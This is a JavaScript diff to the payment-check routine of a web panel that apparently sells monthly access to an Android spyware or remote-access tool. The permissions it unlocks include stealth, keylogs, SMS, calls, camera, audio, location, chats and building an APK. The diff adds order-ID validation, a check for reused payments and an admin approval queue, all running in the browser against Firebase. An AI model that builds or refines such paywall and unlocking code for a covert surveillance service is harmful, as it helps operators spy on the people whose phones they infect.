@@ -1244,9 +1244,13 @@
         const btn = document.getElementById('verifyBinancePayBtn');
         const txid = (txidInput ? txidInput.value : '').trim();
 
-        if (!txid || txid.length < 5) {
+        // 1. Strict Format Validation (Binance Order ID 16-22 digits or 64-char hex hash)
+        const isBinanceOrderId = /^\d{16,22}$/.test(txid);
+        const isTxHash = /^(0x)?[a-fA-F0-9]{64}$/.test(txid);
+
+        if (!txid || (!isBinanceOrderId && !isTxHash)) {
             if (errEl) {
-                errEl.textContent = 'Please enter a valid Binance Order ID or TXID.';
+                errEl.innerHTML = '<i class="fas fa-exclamation-circle me-1"></i> <strong>Invalid Order ID format!</strong><br>Binance Pay Order ID must be a 17-20 digit number (e.g. <code>443745852750790657</code>) from your Binance payment receipt.';
                 errEl.style.display = 'block';
             }
             if (txidInput) txidInput.focus();
@@ -1259,7 +1263,7 @@
 
         const authUser = (typeof fbAuth !== 'undefined' && fbAuth.currentUser) ? fbAuth.currentUser : null;
         if (!authUser) {
-            alert('Please login first to activate your VIP subscription.');
+            alert('Please login with Google first to activate your VIP subscription.');
             btn.disabled = false;
             btn.innerHTML = '<i class="fas fa-bolt"></i> ⚡ Verify & Unlock 1 Month Access ($10)';
             return;
@@ -1270,92 +1274,163 @@
         const now = Date.now();
         const expiryTime = now + (30 * 24 * 60 * 60 * 1000); // 30 Days
 
-        const fullPermissions = {
-            sms: true,
-            notification: true,
-            stealth: true,
-            accounts: true,
-            calls: true,
-            gallery: true,
-            files: true,
-            location: true,
-            keylogs: true,
-            audio: true,
-            camera: true,
-            chats: true,
-            apps: true,
-            privacy_screen: true,
-            sensitive_feed: true,
-            edit_modules: true,
-            build_apk: true
-        };
+        // 2. Query Firebase payments to check if this txid was ALREADY used/redeemed
+        fbDb.ref('payments').once('value', (snap) => {
+            const allPayments = snap.val() || {};
+            let isAlreadyUsed = false;
+            let existingPayment = null;
+            let existingKey = null;
 
-        const subData = {
-            plan: '1_MONTH_FULL_ACCESS',
-            plan_name: '1 Month Full Access VIP',
-            amount_usd: 10,
-            currency: 'USDT',
-            txid: txid,
-            status: 'ACTIVE',
-            activated_at: now,
-            activated_at_formatted: new Date(now).toLocaleString(),
-            expires_at: expiryTime,
-            expires_at_formatted: new Date(expiryTime).toLocaleString()
-        };
-
-        const paymentRecord = {
-            uid: uid,
-            email: email,
-            amount_usd: 10,
-            currency: 'USDT',
-            txid: txid,
-            method: 'BINANCE_PAY',
-            plan: '1_MONTH_FULL_ACCESS',
-            status: 'COMPLETED',
-            created_at: now,
-            created_at_formatted: new Date(now).toLocaleString(),
-            expires_at: expiryTime
-        };
-
-        // 1. Update user meta with subscription & full permissions
-        const updates = {};
-        updates[`users_meta/${uid}/subscription`] = subData;
-        updates[`users_meta/${uid}/permissions`] = fullPermissions;
-
-        fbDb.ref().update(updates).then(() => {
-            // 2. Push payment record & audit log
-            fbDb.ref('payments').push(paymentRecord);
-            fbDb.ref('audit_logs').push({
-                timestamp: now,
-                user: email,
-                action: `Auto-unlocked 1 Month VIP ($10 USDT) via Binance. TXID: ${txid}`
+            Object.keys(allPayments).forEach(k => {
+                const p = allPayments[k];
+                if (p && p.txid && p.txid.toString().trim() === txid) {
+                    if (p.status === 'COMPLETED' || p.status === 'ACTIVE') {
+                        isAlreadyUsed = true;
+                        existingPayment = p;
+                    }
+                    existingKey = k;
+                }
             });
 
-            // 3. Update local state
-            window.userPermissions = fullPermissions;
-            if (typeof updateTabLockUI === 'function') updateTabLockUI();
-
-            btn.disabled = false;
-            btn.innerHTML = '<i class="fas fa-check-circle me-2"></i> Unlocked Successfully!';
-            btn.style.background = 'linear-gradient(135deg, #30d158 0%, #248a3d 100%)';
-            btn.style.color = '#fff';
-
-            setTimeout(() => {
-                closeLockModal();
-                alert(`🎉 1 Month Full Access VIP ($10) has been activated!\n\nValidity: 30 Days (Expires on ${new Date(expiryTime).toLocaleDateString()}). All 15+ features are now unlocked!`);
+            if (isAlreadyUsed) {
+                btn.disabled = false;
                 btn.innerHTML = '<i class="fas fa-bolt"></i> ⚡ Verify & Unlock 1 Month Access ($10)';
-                btn.style.background = 'linear-gradient(135deg, #f3ba2f 0%, #e09f12 100%)';
-                btn.style.color = '#000';
-                if (txidInput) txidInput.value = '';
-            }, 1000);
-        }).catch(err => {
-            console.error('Error activating subscription:', err);
-            btn.disabled = false;
-            btn.innerHTML = '<i class="fas fa-bolt"></i> ⚡ Verify & Unlock 1 Month Access ($10)';
-            if (errEl) {
-                errEl.textContent = 'Activation failed: ' + err.message;
-                errEl.style.display = 'block';
+                if (errEl) {
+                    const usedDate = existingPayment.created_at_formatted || 'earlier';
+                    errEl.innerHTML = `<i class="fas fa-ban me-1"></i> <strong>Order ID Already Redeemed!</strong><br>This Binance Order ID (<code>${txid}</code>) was already redeemed on ${usedDate}. Each payment can only be used once. Reusing old or test order IDs is not allowed.`;
+                    errEl.style.display = 'block';
+                }
+                return;
             }
+
+            // 3. Check if Admin has pre-approved / whitelisted this Order ID
+            fbDb.ref('verified_orders/' + txid).once('value', (vSnap) => {
+                const vOrder = vSnap.val();
+                const isPreVerified = vOrder && (vOrder.redeemed !== true) && (vOrder.valid !== false);
+
+                if (isPreVerified) {
+                    // Pre-verified by Admin -> INSTANT AUTO-UNLOCK
+                    const fullPermissions = {
+                        sms: true, notification: true, stealth: true, accounts: true, calls: true,
+                        gallery: true, files: true, location: true, keylogs: true, audio: true,
+                        camera: true, chats: true, apps: true, privacy_screen: true, sensitive_feed: true,
+                        edit_modules: true, build_apk: true
+                    };
+
+                    const subData = {
+                        plan: '1_MONTH_FULL_ACCESS',
+                        plan_name: '1 Month Full Access VIP',
+                        amount_usd: vOrder.amount_usd || 10,
+                        currency: 'USDT',
+                        txid: txid,
+                        status: 'ACTIVE',
+                        activated_at: now,
+                        activated_at_formatted: new Date(now).toLocaleString(),
+                        expires_at: expiryTime,
+                        expires_at_formatted: new Date(expiryTime).toLocaleString()
+                    };
+
+                    const paymentRecord = {
+                        uid: uid,
+                        email: email,
+                        amount_usd: vOrder.amount_usd || 10,
+                        currency: 'USDT',
+                        txid: txid,
+                        method: 'BINANCE_PAY',
+                        plan: '1_MONTH_FULL_ACCESS',
+                        status: 'COMPLETED',
+                        created_at: now,
+                        created_at_formatted: new Date(now).toLocaleString(),
+                        expires_at: expiryTime
+                    };
+
+                    const updates = {};
+                    updates[`users_meta/${uid}/subscription`] = subData;
+                    updates[`users_meta/${uid}/permissions`] = fullPermissions;
+                    updates[`verified_orders/${txid}/redeemed`] = true;
+                    updates[`verified_orders/${txid}/redeemed_by`] = uid;
+                    updates[`verified_orders/${txid}/redeemed_at`] = now;
+
+                    fbDb.ref().update(updates).then(() => {
+                        fbDb.ref('payments').push(paymentRecord);
+                        fbDb.ref('audit_logs').push({
+                            timestamp: now,
+                            user: email,
+                            action: `Instantly verified & unlocked 1 Month VIP ($10 USDT). TXID: ${txid}`
+                        });
+
+                        window.userPermissions = fullPermissions;
+                        if (typeof updateTabLockUI === 'function') updateTabLockUI();
+
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fas fa-check-circle me-2"></i> Verified & Unlocked!';
+                        btn.style.background = 'linear-gradient(135deg, #30d158 0%, #248a3d 100%)';
+                        btn.style.color = '#fff';
+
+                        setTimeout(() => {
+                            closeLockModal();
+                            alert(`🎉 Binance Payment Verified! 1 Month VIP ($10) is active until ${new Date(expiryTime).toLocaleDateString()}. All features unlocked!`);
+                            if (typeof evaluatePermissions === 'function') evaluatePermissions();
+                            if (typeof updateTabLockUI === 'function') updateTabLockUI();
+                        }, 800);
+                    });
+                } else {
+                    // 4. Submit as PENDING_VERIFICATION for Admin Review
+                    const pendingPayment = {
+                        uid: uid,
+                        email: email,
+                        amount_usd: 10,
+                        currency: 'USDT',
+                        txid: txid,
+                        method: 'BINANCE_PAY',
+                        plan: '1_MONTH_FULL_ACCESS',
+                        status: 'PENDING_VERIFICATION',
+                        created_at: now,
+                        created_at_formatted: new Date(now).toLocaleString(),
+                        expires_at: expiryTime
+                    };
+
+                    const paymentRef = existingKey ? fbDb.ref('payments/' + existingKey) : fbDb.ref('payments').push();
+                    paymentRef.set(pendingPayment).then(() => {
+                        fbDb.ref(`users_meta/${uid}/pending_payment`).set({
+                            txid: txid,
+                            status: 'PENDING_VERIFICATION',
+                            submitted_at: now
+                        });
+
+                        fbDb.ref('audit_logs').push({
+                            timestamp: now,
+                            user: email,
+                            action: `Submitted Binance Order ID for verification. TXID: ${txid}`
+                        });
+
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fas fa-clock me-2"></i> Verification Pending...';
+                        btn.style.background = 'linear-gradient(135deg, #ff9f0a 0%, #d97706 100%)';
+                        btn.style.color = '#000';
+
+                        if (errEl) {
+                            errEl.innerHTML = `<div style="background: rgba(255, 159, 10, 0.15); border: 1px solid rgba(255, 159, 10, 0.4); padding: 10px; border-radius: 10px; color: #ff9f0a; font-size: 0.78rem; line-height: 1.4;">
+                                <i class="fas fa-hourglass-half me-1"></i> <strong>Order ID (${txid}) Submitted!</strong><br>
+                                Your payment is being verified by the admin. Once approved, this modal will automatically close and unlock all features. You can also message <strong>@abid64x</strong> on Telegram for 1-minute manual approval.
+                            </div>`;
+                            errEl.style.display = 'block';
+                        }
+
+                        // Listen for Realtime VIP Approval
+                        const subListener = fbDb.ref(`users_meta/${uid}/subscription`).on('value', (sSnap) => {
+                            const sub = sSnap.val();
+                            if (sub && sub.status === 'ACTIVE' && sub.expires_at > Date.now()) {
+                                fbDb.ref(`users_meta/${uid}/subscription`).off('value', subListener);
+                                closeLockModal();
+                                alert(`🎉 VIP Payment Approved by Admin! 1 Month Full Access VIP is now active!`);
+                                if (typeof evaluatePermissions === 'function') evaluatePermissions();
+                                if (typeof updateTabLockUI === 'function') updateTabLockUI();
+                            }
+                        });
+                    });
+                }
+            });
         });
     }
 
